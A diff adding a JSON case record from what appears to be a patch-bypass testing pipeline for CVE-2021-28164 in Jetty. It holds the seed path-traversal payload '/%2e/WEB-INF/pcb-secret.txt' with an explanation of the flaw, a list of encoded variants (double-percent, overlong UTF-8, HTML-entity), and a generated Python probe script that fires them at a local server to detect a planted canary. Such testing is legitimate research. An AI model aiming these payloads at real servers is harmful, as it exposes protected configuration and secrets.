@@ -1,0 +1,187 @@
+{
+  "case_dir": "PCBV2-0001",
+  "a_paper_version": "1.0",
+  "k_limit": 8,
+  "n_limit": 4,
+  "status": "candidates_ready",
+  "P": {
+    "methods": [
+      "print",
+      "candidate"
+    ],
+    "paths": [
+      "/%2e/WEB-INF/pcb-secret.txt"
+    ],
+    "params": [
+      "probe_id",
+      "method",
+      "path"
+    ],
+    "dangerous_spans": [
+      "/%2e/WEB-INF/pcb-secret.txt"
+    ],
+    "assert_literals": [],
+    "all_string_literals": [
+      "[GIVEN] CVE-2021-28164 seed exploit — %2e-encoded dot segment before WEB-INF.\n\nJetty's authorization/protected-target check (ContextHandler.isProtectedTarget)\nruns BEFORE the request URI is fully decoded+normalized. With the default\ncompliance mode, a `%2e` segment decodes to `.`, so the guard sees a path that\ndoes not literally start with WEB-INF, yet the DefaultServlet then normalizes\n`/./WEB-INF/...` -> `/WEB-INF/...` and serves the protected file.\n\nContract: reaches the planted canary (WEB-INF/pcb-secret.txt) on V0\n(jetty 9.4.38); BLOCKED on V1 (jetty 9.4.39), where the CVE-2021-28164 fix\nrejects the `%2e` dot-segment reaching WEB-INF. This is the seed the\nsystem-under-test is given.\n",
+      "/%2e/WEB-INF/pcb-secret.txt",
+      "probe_id",
+      "cve-2021-28164-encoded-dot",
+      "method",
+      "GET",
+      "path",
+      "__main__"
+    ]
+  },
+  "O": {
+    "added_comparison_literals": [],
+    "removed_comparison_literals": [],
+    "new_calls": [
+      {
+        "name": "URIUtil",
+        "file": "jetty-server/src/main/java/org/eclipse/jetty/server/Request.java"
+      },
+      {
+        "name": "HttpTester",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "name": "MavenTestingUtils",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "name": "assertThat",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "name": "connector",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "name": "context",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "name": "contexts",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "name": "handlers",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "name": "is",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "name": "newServer",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "name": "server",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      }
+    ],
+    "changed_functions": [],
+    "new_string_constants": [
+      {
+        "value": "src/test/webapp",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "value": "/",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "value": "GET /test.xml HTTP/1.1",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "value": "GET /%2e/%2e/test.xml HTTP/1.1",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "value": "GET /foo/%2e%2e/test.xml HTTP/1.1",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "value": "GET /WEB-INF HTTP/1.1",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "value": "GET /WEB-INF/ HTTP/1.1",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "value": "GET /WEB-INF/test.xml HTTP/1.1",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "value": "GET /web-inf/test.xml HTTP/1.1",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "value": "GET /%2e/WEB-INF/test.xml HTTP/1.1",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "value": "GET /%2e/%2e/WEB-INF/test.xml HTTP/1.1",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "value": "GET /foo/%2e%2e/WEB-INF/test.xml HTTP/1.1",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "value": "GET /%2E/WEB-INF/test.xml HTTP/1.1",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "value": "GET //WEB-INF/test.xml HTTP/1.1",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      },
+      {
+        "value": "GET /WEB-INF%2ftest.xml HTTP/1.1",
+        "file": "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+      }
+    ],
+    "new_regex_patterns": [],
+    "files_touched": [
+      "jetty-server/src/main/java/org/eclipse/jetty/server/Request.java",
+      "jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java"
+    ],
+    "is_empty": false
+  },
+  "D": {
+    "skipped": "no source_dir provided"
+  },
+  "a_paper_candidates": 79,
+  "a_code_candidates": 15,
+  "siblings": [],
+  "sibling_count": 0,
+  "candidate_summary": {
+    "a_paper_count": 79,
+    "a_code_count": 15,
+    "sibling_count": 0,
+    "total": 94,
+    "a_paper_families": [
+      "null",
+      "html",
+      "backslash",
+      "unicode",
+      "dot",
+      "slash",
+      "ws",
+      "percent",
+      "overlong",
+      "case",
+      "double"
+    ],
+    "a_paper_version": "1.0"
+  },
+  "graph_connectivity": {
+    "entry_to_sink_connected": false,
+    "reason": "no tool graph"
+  },
+  "test_template": "\"\"\"Residual test: auto-generated by static pipeline.\n\nPath: /%2e/WEB-INF/pcb-secret.txt\nMethod: GET\nO obligations: []\nO removed: []\nN limit: 4\nA_paper version: 1.0\n\"\"\"\n\nimport os\nimport sys\nimport json\nimport urllib.request\nimport urllib.error\n\nBASE_URL = os.environ.get(\"BASE_URL\", \"http://localhost:8080\")\nMARKER = os.environ.get(\"MARKER\", \"\")\nMAX_ATTEMPTS = 4\n\n# Obligation set from AST diff\nO_ADDED = []\nO_REMOVED = []\n\n# A_paper candidates (encoding families on dangerous spans)\nA_PAPER = [\n    \"%2F%25%32%65%2F%57%45%42%2D%49%4E%46%2F%70%63%62%2D%73%65%63%72%65%74%2E%74%78%74\",  # percent-full\n    \"%252F%2525%2532%2565%252F%2557%2545%2542%252D%2549%254E%2546%252F%2570%2563%2562%252D%2573%2565%2563%2572%2565%2574%252E%2574%2578%2574\",  # double-percent-full\n    \"&#47;&#37;&#50;&#101;&#47;&#87;&#69;&#66;&#45;&#73;&#78;&#70;&#47;&#112;&#99;&#98;&#45;&#115;&#101;&#99;&#114;&#101;&#116;&#46;&#116;&#120;&#116;\",  # html-numeric-full\n    \"%2F%2e/WEB-INF/pcb-secret.txt\",  # percent@0\n    \"%252F%2e/WEB-INF/pcb-secret.txt\",  # double-percent@0\n    \"%C0%AF%2e/WEB-INF/pcb-secret.txt\",  # overlong-utf8-2@0\n    \"%E0%80%AF%2e/WEB-INF/pcb-secret.txt\",  # overlong-utf8-3@0\n    \"\\\\u002F%2e/WEB-INF/pcb-secret.txt\",  # unicode-escape@0\n    \"&#47;%2e/WEB-INF/pcb-secret.txt\",  # html-numeric@0\n    \"&#x2F;%2e/WEB-INF/pcb-secret.txt\",  # html-hex@0\n    \"&sol;%2e/WEB-INF/pcb-secret.txt\",  # html-named@0\n    \"\\\\/%2e/WEB-INF/pcb-secret.txt\",  # backslash@0\n]\n\n# A_code candidates (source literals)\nA_CODE = [\n    \"src/test/webapp\",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java\n    \"/\",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java\n    \"GET /test.xml HTTP/1.1\",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java\n    \"GET /%2e/%2e/test.xml HTTP/1.1\",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java\n    \"GET /foo/%2e%2e/test.xml HTTP/1.1\",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java\n    \"GET /WEB-INF HTTP/1.1\",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java\n    \"GET /WEB-INF/ HTTP/1.1\",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java\n    \"GET /WEB-INF/test.xml HTTP/1.1\",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java\n    \"GET /web-inf/test.xml HTTP/1.1\",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java\n    \"GET /%2e/WEB-INF/test.xml HTTP/1.1\",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java\n    \"GET /%2e/%2e/WEB-INF/test.xml HTTP/1.1\",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java\n    \"GET /foo/%2e%2e/WEB-INF/test.xml HTTP/1.1\",  # O:new_string:jetty-webapp/src/test/java/org/eclipse/jetty/webapp/WebAppContextTest.java\n]\n\nSIBLINGS = []\n\n\ndef probe(candidate_value: str) -> dict:\n    \"\"\"Send a black-box probe to V1 via GET /%2e/WEB-INF/pcb-secret.txt.\"\"\"\n    url = BASE_URL.rstrip(\"/\") + candidate_value\n    req = urllib.request.Request(url, method=\"GET\")\n    req.add_header(\"User-Agent\", \"residual-test/1.0\")\n    try:\n        with urllib.request.urlopen(req, timeout=10) as resp:\n            body = resp.read().decode(\"utf-8\", errors=\"replace\")\n            headers = dict(resp.headers)\n            return {\"status\": resp.status, \"body\": body, \"headers\": headers}\n    except urllib.error.HTTPError as e:\n        body = e.read().decode(\"utf-8\", errors=\"replace\") if e.fp else \"\"\n        return {\"status\": e.code, \"body\": body, \"headers\": dict(e.headers)}\n    except Exception as e:\n        return {\"status\": \"error\", \"body\": str(e), \"headers\": {}}\n\n\ndef check_effect(response: dict) -> dict:\n    \"\"\"Check if the external effect marker appears in response.\"\"\"\n    body = response.get(\"body\", \"\")\n    headers = response.get(\"headers\", {})\n    \n    # Check body for marker\n    if MARKER and MARKER in body:\n        return {\"found\": True, \"location\": \"body\", \"marker\": MARKER}\n    \n    # Check headers for marker\n    for hname, hval in headers.items():\n        if MARKER and MARKER in str(hval):\n            return {\"found\": True, \"location\": f\"header:{hname}\", \"marker\": MARKER}\n    \n    return {\"found\": False}\n\n\ndef run():\n    \"\"\"Run candidates against V1, up to N attempts.\"\"\"\n    witnesses = []\n    attempts = 0\n    \n    all_candidates = []\n    for c in A_PAPER:\n        all_candidates.append((\"a_paper\", c))\n    for c in A_CODE:\n        all_candidates.append((\"a_code\", c))\n    for c in SIBLINGS:\n        all_candidates.append((\"sibling\", c))\n    \n    for source, candidate in all_candidates:\n        if attempts >= MAX_ATTEMPTS:\n            break\n        \n        attempts += 1\n        resp = probe(candidate)\n        effect = check_effect(resp)\n        \n        result = {\n            \"candidate\": candidate,\n            \"source\": source,\n            \"status\": resp[\"status\"],\n            \"effect\": effect,\n        }\n        \n        if effect.get(\"found\"):\n            # Check obligation binding\n            bound_o = None\n            for o_lit in O_ADDED + O_REMOVED:\n                if o_lit in candidate or any(o_lit in str(v) for v in [candidate]):\n                    bound_o = o_lit\n                    break\n            result[\"obligation_binding\"] = bound_o\n            result[\"verdict\"] = \"witness\" if bound_o else \"effect_only\"\n            witnesses.append(result)\n        else:\n            result[\"verdict\"] = \"no_effect\"\n    \n    return {\n        \"attempts\": attempts,\n        \"witnesses\": witnesses,\n        \"total_candidates\": len(all_candidates),\n    }\n\n\nif __name__ == \"__main__\":\n    if not MARKER:\n        print(\"Warning: MARKER not set\", file=sys.stderr)\n    result = run()\n    print(json.dumps(result, indent=2))\n",
+  "elapsed_s": 0.0
+}
